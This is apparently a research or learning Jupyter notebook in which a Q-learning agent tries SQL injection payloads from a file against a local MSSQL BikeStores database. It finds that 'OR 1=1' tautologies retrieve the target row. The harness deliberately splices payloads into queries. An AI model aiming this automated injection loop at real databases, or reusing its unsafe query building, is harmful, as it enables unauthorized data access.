{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 288,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys\n",
    "import random"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 289,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True, 'query_result_length': 10000, 'padding_char': '\\x00'}, 'contexts': [{'query': 'SELECT * FROM production.products WHERE brand_id=8 [INPUT]', 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 290,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "name = db['name']\n",
    "server = db['server']\n",
    "driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={driver};SERVER={server};DATABASE={name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 291,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "query_result_length = state_info_config['query_result_length']\n",
    "padding_char = state_info_config['padding_char']\n",
    "error_char = 'y'\n",
    "no_error_char = 'n'\n",
    "\n",
    "# If a query result is an error, and if mark_error is true, this distinction will be added to the state information.\n",
    "# TODO: Ensure mark_error information has a higher weighting in the neural net.\n",
    "nn_input_size = query_result_length\n",
    "if(mark_error):\n",
    "    nn_input_size += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 292,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Not having any defined RL contexts will result in an error.\n",
    "contexts = config['rl']['contexts']\n",
    "context = contexts[0]\n",
    "context_index = 0\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def incr_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "        return True\n",
    "    return False"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Functionality"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 293,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def inject_payload(payload_index):\n",
    "    global qtable\n",
    "    \n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    payload = payloads[payload_index]\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "\n",
    "    reward = -1\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        # Runs SQL injection query.\n",
    "        df = pd.read_sql(query, engine)\n",
    "        res = df.to_csv()\n",
    "\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "        for column in context['column_filter']:\n",
    "            if column in df and context['goal'] in df[column].values:\n",
    "                reward = 100\n",
    "                episode_over = True\n",
    "\n",
    "        has_error = no_error_char\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = error_char\n",
    "\n",
    "    # Trim resulting string or pad it so that the length is equal to query_result_length.\n",
    "    if len(res) > query_result_length:\n",
    "        res = res[:query_result_length]\n",
    "    else:\n",
    "        res = res.ljust(query_result_length, padding_char)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res = res + has_error\n",
    "\n",
    "    # If the state exists, retrieve it, then return it and its index.\n",
    "    for i in range(0, len(states_info)):\n",
    "        state_info = states_info[i]\n",
    "        if state_info == res:\n",
    "            return states_info.index(res), reward, episode_over, res\n",
    "\n",
    "    # If the state does not exist, create a new state. The states info list as well as the Q-Table must be appeneded with this new state. \n",
    "    # After creation of the new state, return it and its index.\n",
    "    states_info.append(res)\n",
    "    qtable = np.concatenate((qtable, np.zeros((1, len(payloads)))), axis=0)\n",
    "    return len(states_info) - 1, reward, episode_over, res"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Q-Learning Parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 294,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Q-Learning adapted from: https://deeplizard.com/learn/video/ZaILVnqZFCg\n",
    "\n",
    "total_episodes = 100          # Total episodes\n",
    "learning_rate = 0.8           # Learning rate\n",
    "max_steps = 99                # Max steps per episode\n",
    "gamma = 0.95                  # Discounting rate\n",
    "\n",
    "# Exploration parameters\n",
    "epsilon = 1.0                 # Exploration rate\n",
    "max_epsilon = 1.0             # Exploration probability at start\n",
    "min_epsilon = 0.01            # Minimum exploration probability \n",
    "decay_rate = 0.005            # Exponential decay rate for exploration prob"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Q-Learning Algorithm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 295,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Learned Q-Table:\n",
      " [[ 0.    0.   -0.96 ...  0.    0.    0.  ]\n",
      " [ 0.    0.    0.   ...  0.    0.    0.  ]\n",
      " [ 0.    0.    0.   ...  0.    0.    0.  ]\n",
      " ...\n",
      " [ 0.    0.    0.   ...  0.    0.    0.  ]\n",
      " [ 0.    0.    0.   ...  0.    0.    0.  ]\n",
      " [80.    0.    0.   ...  0.    0.    0.  ]]\n"
     ]
    }
   ],
   "source": [
    "states_info = [padding_char * query_result_length]\n",
    "if mark_error:\n",
    "    states_info[0] = states_info[0] + no_error_char\n",
    "\n",
    "# Initialise Q-Table with a singleton.\n",
    "qtable = np.zeros((1, len(payloads)))\n",
    "\n",
    "rewards = []\n",
    "terminating_actions = set()\n",
    "\n",
    "for episode in range(total_episodes):\n",
    "    # Reset the environment\n",
    "    state = 0\n",
    "    step = 0\n",
    "    done = False\n",
    "    total_rewards = 0\n",
    "    \n",
    "    for step in range(max_steps):\n",
    "        exp_exp_tradeoff = random.uniform(0, 1)\n",
    "        \n",
    "        # If this number > greater than epsilon --> exploitation (taking the biggest Q value for this state).\n",
    "        if exp_exp_tradeoff > epsilon:\n",
    "            action = np.argmax(qtable[state,:])\n",
    "\n",
    "        # Else doing a random choice --> exploration\n",
    "        else:\n",
    "            action = random.randint(0, len(payloads)-1)\n",
    "\n",
    "        # Take the action (a) and observe the outcome state(s') and reward (r).\n",
    "        new_state, reward, done, info = inject_payload(action)\n",
    "\n",
    "        # Update Q(s,a):= Q(s,a) + lr [R(s,a) + gamma * max Q(s',a') - Q(s,a)].\n",
    "        # qtable[new_state,:] : all the actions we can take from new state.\n",
    "        qtable[state, action] = qtable[state, action] + learning_rate * (reward + gamma * np.max(qtable[new_state, :]) - qtable[state, action])\n",
    "        \n",
    "        total_rewards += reward\n",
    "        \n",
    "        state = new_state\n",
    "        \n",
    "        # Finish episode upon terminal state reached.\n",
    "        if done == True:\n",
    "            terminating_actions.add(action)\n",
    "            break\n",
    "        \n",
    "    # Reduce epsilon (because we need less and less exploration)\n",
    "    epsilon = min_epsilon + (max_epsilon - min_epsilon)*np.exp(-decay_rate*episode)\n",
    "    rewards.append(total_rewards)\n",
    "\n",
    "print('Learned Q-Table:\\n', qtable)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 296,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Score over time: 88.34\n",
      "Number of states: 438\n",
      "Terminating payloads:\n",
      " ['OR 1=1', 'OR 1=1-- ']\n"
     ]
    }
   ],
   "source": [
    "print('Score over time:', str(sum(rewards)/total_episodes))\n",
    "print('Number of states:', len(qtable))\n",
    "print('Terminating payloads:\\n', [payloads[a] for a in terminating_actions])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
